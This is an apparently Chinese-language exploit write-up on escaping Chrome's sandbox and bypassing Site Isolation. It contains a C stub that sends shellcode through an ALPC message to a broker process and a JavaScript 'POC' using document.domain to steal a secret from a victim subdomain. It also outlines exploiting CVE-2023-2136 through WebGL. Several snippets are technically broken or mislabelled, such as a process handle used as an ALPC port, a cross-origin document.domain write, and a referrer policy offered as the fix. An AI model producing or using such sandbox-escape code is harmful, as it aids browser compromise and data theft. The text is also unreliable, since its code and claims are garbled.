#include <windows.h>
#include <ntstatus.h>

// 假设已获取端口句柄hPort
HANDLE hPort = OpenProcess(PROCESS_DUP_HANDLE, FALSE, brokerPid); // 实际需从共享内存获取

// 构造ALPC消息
ALPC_MESSAGE msg = {0};
msg.Header.u1.s1.TotalLength = sizeof(ALPC_MESSAGE);
msg.Header.u1.s1.DataLength = 0x100; // 伪造长度
// 填充payload触发漏洞
memcpy(msg.PortMessage, shellcode, shellcode_len);

// 发送
NTSTATUS status = NtAlpcSendWaitReceivePort(hPort, 0, &msg, NULL, NULL, NULL, NULL, NULL);


注意：实际利用需要绕过CFG和ACL，且需配合信息泄露定位Broker句柄。修复方式：微软和Chromium团队通过强化ALPC消息验证、限制端口访问权限、使用更严格的沙箱策略来缓解此类攻击。受影响版本：Chrome 91之前（CVE-2021-30554相关）。

Site Isolation是Chrome从版本67开始引入的安全机制，它将不同站点的页面分配到不同的渲染器进程中，即使这些页面在同一个标签页中（通过iframe）。原理：每个渲染器进程只能访问与其站点对应的数据，跨站点资源（如iframe中的内容）通过IPC从其他进程获取，且渲染器无法直接访问其他站点的内存。这防止了类似Spectre的侧信道攻击和同源策略绕过。绕过方法之一：利用SharedArrayBuffer（SAB）和postMessage。虽然SAB在Site Isolation下被限制，但攻击者可以通过创建同站点窗口并利用postMessage传递SAB引用，再通过定时攻击或内存布局差异读取跨站点数据。另一种经典绕过：利用window.open打开目标站点窗口，然后通过opener引用访问该窗口的location对象，但Site Isolation会阻止跨进程location访问。更实际的绕过：利用Service Worker拦截请求并修改响应，但Service Worker受限于同源。以下JavaScript代码演示一种理论绕过：通过SharedArrayBuffer在同一个站点下跨窗口传递数据，但无法直接跨站点。实际绕过需要结合其他漏洞（如CVE-2021-30554）。

javascript
// 假设攻击者页面与目标页面同站点（但不同子域）
// 创建SharedArrayBuffer
const sab = new SharedArrayBuffer(1024);
const view = new Uint8Array(sab);

// 通过postMessage发送给同站点窗口
window.open('https://attacker.example.com/child.html');
window.addEventListener('message', (e) => {
  if (e.data.type === 'ready') {
    e.source.postMessage({type: 'sab', sab: sab}, 'https://attacker.example.com');
  }
});


在子窗口中，接收SAB并修改内容，父窗口可读取。但此方法仅限同站点，无法绕过Site Isolation的跨站点隔离。真正的绕过需要利用浏览器漏洞（如Mojo IPC漏洞）来破坏进程边界。

Site Isolation的核心是跨站点页面必须位于不同渲染器进程。但是，同站点（相同eTLD+1）的页面可以共享同一个进程。攻击者可以利用这一点：假设攻击者控制`attacker.example.com`，目标站点是`victim.example.com`（同站点但不同子域）。攻击者通过`window.open('https://victim.example.com')`打开目标窗口，由于同站点，两个页面可能被分配到同一个渲染器进程。此时，攻击者页面可以通过`window.opener`或`window.open`返回的引用访问目标窗口的`location`、`document`等属性（但受同源策略限制，如果子域不同，则跨域访问被阻止）。然而，如果目标站点存在CORS配置错误或允许通过`document.domain`降低安全域，攻击者可以设置`document.domain = 'example.com'`，从而绕过同源策略，读取目标窗口的DOM。这实际上绕过了Site Isolation的进程隔离，因为两个页面在同一个进程中，同源策略成为唯一屏障。以下JavaScript POC演示如何利用`document.domain`绕过：

javascript
// 攻击者页面：attacker.example.com
// 打开同站点目标窗口
targetWin = window.open('https://victim.example.com/secret.html');

// 等待加载后设置document.domain
targetWin.onload = function() {
  // 设置document.domain为example.com
  targetWin.document.domain = 'example.com';
  document.domain = 'example.com';

  // 现在可以跨子域访问
  var secret = targetWin.document.getElementById('secret').innerText;
  console.log('Stolen:', secret);
};


注意：此方法要求目标站点允许`document.domain`设置（默认允许），且两个子域均属于同一eTLD+1。Chrome的Site Isolation并未阻止同站点进程共享，因此这种绕过属于设计上的限制，而非漏洞。修复方式：建议站点不要依赖`document.domain`，并启用`Strict-Origin-When-Cross-Origin`策略。

CVE-2023-2136是Chrome GPU进程中的一个堆缓冲区溢出漏洞，影响Chrome 112之前版本。漏洞位于ANGLE（OpenGL ES到DirectX的转换层）中，处理`glDrawElements`命令时未正确验证索引缓冲区长度。成因：Renderer进程通过Mojo将GPU命令缓冲区传递给GPU进程，其中包含顶点索引数据。攻击者可以构造一个超大的索引值，导致GPU进程在读取索引时越界访问堆内存。利用思路：通过WebGL API提交恶意着色器和顶点数据，触发GPU进程中的溢出，覆盖关键对象（如命令缓冲区状态结构），最终劫持GPU进程的控制流。由于GPU进程沙箱权限有限，逃逸后需再结合内核漏洞提权。以下GLSL着色器代码示例（简化）：

glsl
// 顶点着色器
attribute vec4 position;
void main() {
  gl_Position = position;
}

// 片段着色器
void main() {
  gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
}


